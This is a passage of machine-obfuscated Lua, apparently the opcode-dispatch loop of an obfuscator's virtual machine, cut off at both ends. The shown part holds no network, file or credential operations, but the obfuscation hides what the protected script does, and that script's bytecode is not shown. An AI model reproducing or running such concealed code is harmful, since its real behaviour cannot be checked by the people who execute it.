r=c[t[n]];c[e+1]=r;c[e]=r[t[l]];end else local l;for f=0,1 do if-3<=f then repeat if 1~=f then l=t[e]c[l](c[l+1])r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];until true;else c[t[e]]=h[t[n]];end end end end else if f<=142 then if 141>f then local k,h,f,j,p,_;for u=0,4 do if 2<=u then if u>=3 then if u>=1 then repeat if u~=3 then c[t[e]]=c[t[n]];break;end;f=t[e]c[f]=c[f](s(c,f+1,o))r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]];end else f=t[e]j,p=b(c[f](s(c,f+1,t[n])))o=p+f-1 _=0;for t=f,o do _=_+1;c[t]=j[_];end;r=r+1;t=d[r];end else if-3~=u then for f=44,61 do if u~=1 then c[t[e]]=a[t[n]];r=r+1;t=d[r];break;end;k=t[n];h=c[k]for t=k+1,t[l]do h=h..c[t];end;c[t[e]]=h;r=r+1;t=d[r];break;end;else k=t[n];h=c[k]for t=k+1,t[l]do h=h..c[t];end;c[t[e]]=h;r=r+1;t=d[r];end end end else if 139~=f then repeat if f~=142 then local a,j,p,k,_,m,f,h,g,y,u;f=0;while f>-1 do if f<=3 then if 2>f then if f~=-4 then for r=37,89 do if f<1 then a=t;break;end;j=e;break;end;else a=t;end else if 2==f then p=n;else k=c;end end else if 5>=f then if f~=2 then for t=26,98 do if f~=5 then _=k[a[p]];break;end;m=a[j];break;end;else _=k[a[p]];end else if f==7 then f=-2;else c[m]=_;end end end f=f+1 end r=r+1;t=d[r];h=t[e]g,y=b(c[h](c[h+1]))o=y+h-1 u=0;for t=h,o do u=u+1;c[t]=g[u];end;r=r+1;t=d[r];h=t[e]c[h](s(c,h+1,o))r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);end end else if 144>f then if(t[e]<=c[t[l]])then r=t[n];else r=r+1;end;else if f~=143 then for s=44,58 do if f~=144 then local s;for f=0,6 do if f>2 then if f<=4 then if 4>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=a[t[n]];r=r+1;t=d[r];end else if 6~=f then c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];else s=t[e]c[s](c[s+1])end end else if f<=0 then c[t[e]]();r=r+1;t=d[r];else if 0<=f then repeat if 2~=f then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end end break;end;c[t[e]]();break;end;else c[t[e]]();end end end end end end end end else if f<=269 then if f<225 then if f<202 then if 190>=f then if 184<f then if f>187 then if 188>=f then local o;for f=0,6 do if f>2 then if 5<=f then if 3~=f then repeat if f~=5 then c[t[e]]=h[t[n]];break;end;c[t[e]]();r=r+1;t=d[r];until true;else c[t[e]]();r=r+1;t=d[r];end else if f>=-1 then repeat if 4>f then o=t[e]c[o](s(c,o+1,t[n]))r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end else if 1>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if f~=-1 then repeat if f>1 then c[t[e]]=c[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=a[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=a[t[n]];r=r+1;t=d[r];end end end end else if 186~=f then for h=48,77 do if f<190 then local r=t[e]local e,t=b(c[r](s(c,r+1,t[n])))o=t+r-1 local t=0;for r=r,o do t=t+1;c[r]=e[t];end;break;end;local h,k,u,o,b,f,a;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=0;while f>-1 do if f<=2 then if f>=1 then if-1<f then repeat if 1<f then u=n;break;end;k=e;until true;else k=e;end else h=t;end else if f<5 then if f>=-1 then repeat if 4~=f then o=h[u];break;end;b=h[k];until true;else o=h[u];end else if f~=1 then for t=37,62 do if f>5 then f=-2;break;end;c(b,o);break;end;else c(b,o);end end end f=f+1 end r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];a=t[e]c[a]=c[a](s(c,a+1,t[n]))r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];break;end;else local h,k,b,o,u,f,a;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=0;while f>-1 do if f<=2 then if f>=1 then if-1<f then repeat if 1<f then b=n;break;end;k=e;until true;else k=e;end else h=t;end else if f<5 then if f>=-1 then repeat if 4~=f then o=h[b];break;end;u=h[k];until true;else o=h[b];end else if f~=1 then for t=37,62 do if f>5 then f=-2;break;end;c(u,o);break;end;else c(u,o);end end end f=f+1 end r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];a=t[e]c[a]=c[a](s(c,a+1,t[n]))r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];end end else if f>185 then if f~=186 then for f=0,3 do if f>1 then if-1<f then repeat if f<3 then c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];break;end;c[t[e]][t[n]]=t[l];until true;else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end else if 0~=f then c(t[e],t[n]);r=r+1;t=d[r];else c[t[e]]={};r=r+1;t=d[r];end end end else local s;for f=0,4 do if f>=2 then if 3>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if 2<f then repeat if f~=3 then if not c[t[e]]then r=r+1;else r=t[n];end;break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if f~=0 then s=t[e]c[s]=c[s]()r=r+1;t=d[r];else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end end else local f,o;for h=0,4 do if 2>h then if h>-1 then repeat if h<1 then c[t[e]]=a[t[n]];r=r+1;t=d[r];break;end;f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];until true;else c[t[e]]=a[t[n]];r=r+1;t=d[r];end else if h<3 then c(t[e],t[n]);r=r+1;t=d[r];else if 0<=h then repeat if h~=3 then if not c[t[e]]then r=r+1;else r=t[n];end;break;end;f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];until true;else if not c[t[e]]then r=r+1;else r=t[n];end;end end end end end end else if 181>=f then if f~=176 then repeat if f<181 then c[t[e]]=c[t[n]]%t[l];break;end;c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);until true;else c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);end else if 183>f then local k,u,f,j,p,_;for a=0,9 do if 4>=a then if 1>=a then if a~=-3 then repeat if a>0 then c[t[e]]=c[t[n]];r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]];r=r+1;t=d[r];end else if 2<a then if a>-1 then for f=45,69 do if 4~=a then k=t[n];u=c[k]for t=k+1,t[l]do u=u..c[t];end;c[t[e]]=u;r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;else k=t[n];u=c[k]for t=k+1,t[l]do u=u..c[t];end;c[t[e]]=u;r=r+1;t=d[r];end else c(t[e],t[n]);r=r+1;t=d[r];end end else if 7<=a then if a<=7 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if a<9 then f=t[e]j,p=b(c[f](c[f+1]))o=p+f-1 _=0;for t=f,o do _=_+1;c[t]=j[_];end;r=r+1;t=d[r];else f=t[e]c[f](s(c,f+1,o))end end else if 1~=a then for l=28,59 do if a~=6 then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;f=t[e]c[f]=c[f]()r=r+1;t=d[r];break;end;else f=t[e]c[f]=c[f]()r=r+1;t=d[r];end end end end else if 184~=f then local f,k,u,a;for h=0,4 do if 1>=h then if 1==h then c(t[e],t[n]);r=r+1;t=d[r];else c(t[e],t[n]);r=r+1;t=d[r];end else if 2<h then if 2<h then for a=24,87 do if 4>h then f=t[e]c[f](s(c,f+1,o))r=r+1;t=d[r];break;end;if(c[t[e]]==t[l])then r=r+1;else r=t[n];end;break;end;else f=t[e]c[f](s(c,f+1,o))r=r+1;t=d[r];end else f=t[e]k,u=b(c[f](s(c,f+1,t[n])))o=u+f-1 a=0;for t=f,o do a=a+1;c[t]=k[a];end;r=r+1;t=d[r];end end end else c[t[e]]=a[t[n]];end end end end else if f>=196 then if f>198 then if 200>f then local s;for f=0,4 do if f>1 then if f<=2 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if 0~=f then repeat if 3<f then if not c[t[e]]then r=r+1;else r=t[n];end;break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else if not c[t[e]]then r=r+1;else r=t[n];end;end end else if-2<=f then repeat if 0~=f then s=t[e]c[s]=c[s]()r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end else if 198<=f then repeat if 200~=f then local t=t[e]c[t]=c[t]()break;end;local f;for o=0,2 do if o>=1 then if-1<o then repeat if o~=2 then f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];until true;else c[t[e]]=h[t[n]];end else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end end until true;else local t=t[e]c[t]=c[t]()end end else if 197>f then local r=t[e];local e=c[r];for t=r+1,t[n]do u.XMvmrncw(e,c[t])end;else if 195<=f then for o=22,53 do if f>197 then c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);break;end;local o;for f=0,6 do if f>2 then if 4>=f then if 3~=f then c(t[e],t[n]);r=r+1;t=d[r];else c(t[e],t[n]);r=r+1;t=d[r];end else if f~=4 then for l=13,60 do if 6>f then c(t[e],t[n]);r=r+1;t=d[r];break;end;o=t[e]c[o]=c[o](s(c,o+1,t[n]))break;end;else o=t[e]c[o]=c[o](s(c,o+1,t[n]))end end else if f>0 then if 0~=f then for s=43,61 do if f<2 then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end break;end;else c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);end end end else if 193>f then if f==192 then local f;c[t[e]]();r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])else c[t[e]]=c[t[n]]+t[l];end else if 193<f then if f>=193 then for s=18,77 do if 194~=f then for f=0,5 do if 3>f then if 1>f then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];else if f>-1 then repeat if 1~=f then c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];break;end;c[t[e]][t[n]]=t[l];r=r+1;t=d[r];until true;else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end end else if 3<f then if 2<f then repeat if 5>f then c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];break;end;c[t[e]]=a[t[n]];until true;else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end end end break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];end else local f,h;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];end end end end else if f<213 then if 206>=f then if 203<f then if f>=205 then if f>203 then repeat if f~=205 then local a,_,u,b,k,f,o;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=0;while f>-1 do if 3>f then if f<=0 then a=t;else if f~=-3 then repeat if f>1 then u=n;break;end;_=e;until true;else u=n;end end else if f<5 then if 3<f then k=a[_];else b=a[u];end else if 4~=f then for t=16,59 do if f~=5 then f=-2;break;end;c(k,b);break;end;else f=-2;end end end f=f+1 end r=r+1;t=d[r];o=t[e]c[o]=c[o](s(c,o+1,t[n]))break;end;local s,f,o,a,b,u,k,_,h;local d=0;while d>-1 do if d>2 then if d<5 then if 3==d then k=s[a];_=s[b];else h=k==_ and f[u]or 1+o;end else if 3<d then repeat if 6~=d then r=h;break;end;d=-2;until true;else r=h;end end else if 1<=d then if d~=1 then a=f[e];b=f[l];u=n;else f=t;o=r;end else s=c;end end d=d+1 end until true;else local u,b,a,_,k,f,o;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=0;while f>-1 do if 3>f then if f<=0 then u=t;else if f~=-3 then repeat if f>1 then a=n;break;end;b=e;until true;else a=n;end end else if f<5 then if 3<f then k=u[b];else _=u[a];end else if 4~=f then for t=16,59 do if f~=5 then f=-2;break;end;c(k,_);break;end;else f=-2;end end end f=f+1 end r=r+1;t=d[r];o=t[e]c[o]=c[o](s(c,o+1,t[n]))end else for f=0,6 do if 2>=f then if 0<f then if f>=-2 then repeat if f<2 then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if f>=5 then if f<6 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];end else if 3<f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end end else if f<203 then local d,f,h,l,s;local r=0;while r>-1 do if r<3 then if 1>r then d=t;else if r~=0 then repeat if 2~=r then f=e;break;end;h=n;until true;else f=e;end end else if 4>=r then if r>2 then repeat if 4>r then l=d[h];break;end;s=d[f];until true;else l=d[h];end else if 3<r then repeat if r>5 then r=-2;break;end;c(s,l);until true;else r=-2;end end end r=r+1 end else local f;c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];if c[t[e]]then r=r+1;else r=t[n];end;end end else if f>=210 then if 211<=f then if 209<=f then for h=47,94 do if f~=212 then do return end;break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];break;end;else do return end;end else local e=t[e];local r=c[t[n]];c[e+1]=r;c[e]=r[c[t[l]]];end else if 207<f then if 205~=f then for o=30,53 do if 209~=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);break;end;local f,h;f=t[e]c[f](c[f+1])r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);end else local f;for s=0,6 do if s>=3 then if s>=5 then if s~=3 then repeat if 5<s then f=t[e]c[f]=c[f]()break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if s>1 then for f=16,52 do if 4>s then c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end end else if 0<s then if s~=0 then repeat if s>1 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;f=t[e]c[f]=c[f]()r=r+1;t=d[r];until true;else f=t[e]c[f]=c[f]()r=r+1;t=d[r];end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end end end end else if f<=218 then if f<=215 then if 213<f then if 214==f then local f;for s=0,4 do if s<=1 then if-2~=s then repeat if s>0 then f=t[e]c[f]=c[f]()r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];until true;else f=t[e]c[f]=c[f]()r=r+1;t=d[r];end else if 2>=s then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if 1<=s then repeat if 4~=s then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;if not c[t[e]]then r=r+1;else r=t[n];end;until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end else local f,h;f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[c[t[l]]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[c[t[l]]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[c[t[l]]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];end else local f;c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];do return end;end else if f>216 then if f~=217 then c[t[e]]=c[t[n]];else if c[t[e]]then r=r+1;else r=t[n];end;end else local f;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];end end else if f<=221 then if 220>f then local h;for f=0,6 do if f<=2 then if 0>=f then c(t[e],t[n]);r=r+1;t=d[r];else if f<2 then c(t[e],t[n]);r=r+1;t=d[r];else h=t[e]c[h]=c[h](s(c,h+1,t[n]))r=r+1;t=d[r];end end else if f>=5 then if f==6 then c[t[e]]={};else c[t[e]]={};r=r+1;t=d[r];end else if f~=0 then repeat if f<4 then c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];break;end;c[t[e]]={};r=r+1;t=d[r];until true;else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end end end end else if 220~=f then local f;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])r=r+1;t=d[r];do return end;else for f=0,6 do if 2>=f then if f<=0 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if-1~=f then repeat if 2>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if 4<f then if 5<f then c(t[e],t[n]);else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if 4==f then c[t[e]]=h[t[n]];r=r+1;t=d[r];else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end end end end else if f<223 then c[t[e]]=c[t[n]]-c[t[l]];else if 222<=f then repeat if 224>f then local f;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];r=t[n];break;end;if not c[t[e]]then r=r+1;else r=t[n];end;until true;else if not c[t[e]]then r=r+1;else r=t[n];end;end end end end end end else if 247>f then if f>=236 then if 241>f then if 238>f then if f>232 then repeat if f~=237 then c(t[e],t[n]);break;end;local f,h;f=t[e]c[f](c[f+1])r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];h=c[t[n]];c[f+1]=h;c[f]=h[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];until true;else c(t[e],t[n]);end else if f>238 then if f>=235 then for r=41,72 do if 240~=f then c[t[e]]=j(p[t[n]],nil,h);break;end;local r=t[e]c[r](s(c,r+1,t[n]))break;end;else local r=t[e]c[r](s(c,r+1,t[n]))end else for f=0,6 do if 3<=f then if f>4 then if f>=2 then for h=47,67 do if 5<f then c[t[e]]=c[t[n]]-c[t[l]];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if f~=1 then for h=29,74 do if f~=4 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if 1<=f then if f~=-3 then for h=33,77 do if f<2 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end end end else if f>243 then if f<=244 then local o,a,k,u,b,f,_;for f=0,6 do if 2<f then if f<=4 then if 3~=f then f=0;while f>-1 do if 3>f then if f>0 then if 2>f then a=e;else k=n;end else o=t;end else if f>4 then if 2~=f then for t=23,55 do if 6>f then c(b,u);break;end;f=-2;break;end;else f=-2;end else if 0<f then for t=23,70 do if f<4 then u=o[k];break;end;b=o[a];break;end;else u=o[k];end end end f=f+1 end r=r+1;t=d[r];else f=0;while f>-1 do if 3<=f then if 4<f then if f>1 then for t=48,56 do if f~=5 then f=-2;break;end;c(b,u);break;end;else f=-2;end else if f>=-1 then repeat if f>3 then b=o[a];break;end;u=o[k];until true;else b=o[a];end end else if 0>=f then o=t;else if f>0 then repeat if f~=1 then k=n;break;end;a=e;until true;else a=e;end end end f=f+1 end r=r+1;t=d[r];end else if f>5 then _=t[e]c[_]=c[_](s(c,_+1,t[n]))else f=0;while f>-1 do if f>=3 then if f<=4 then if 3~=f then b=o[a];else u=o[k];end else if f~=2 then for t=36,52 do if 5<f then f=-2;break;end;c(b,u);break;end;else c(b,u);end end else if 1>f then o=t;else if-2<f then for t=38,88 do if f~=1 then k=n;break;end;a=e;break;end;else a=e;end end end f=f+1 end r=r+1;t=d[r];end end else if 0>=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if-2<=f then for s=16,98 do if 1~=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end else if 242<=f then repeat if 246~=f then c[t[e]]=c[t[n]]%t[l];break;end;local f,h,a,o,s,l;l=0;while l>-1 do if l<=2 then if 0<l then if-3~=l then repeat if 2~=l then h=e;break;end;a=n;until true;else a=n;end else f=t;end else if l<5 then if 4~=l then o=f[a];else s=f[h];end else if l~=1 then repeat if 5<l then l=-2;break;end;c(s,o);until true;else c(s,o);end end end l=l+1 end r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];l=0;while l>-1 do if 2>=l then if l>=1 then if-2~=l then for t=49,91 do if 1<l then a=n;break;end;h=e;break;end;else h=e;end else f=t;end else if l>4 then if 5<l then l=-2;else c(s,o);end else if l~=-1 then for t=12,89 do if 4~=l then o=f[a];break;end;s=f[h];break;end;else s=f[h];end end end l=l+1 end r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);until true;else local f,h,o,a,s,l;l=0;while l>-1 do if l<=2 then if 0<l then if-3~=l then repeat if 2~=l then h=e;break;end;o=n;until true;else o=n;end else f=t;end else if l<5 then if 4~=l then a=f[o];else s=f[h];end else if l~=1 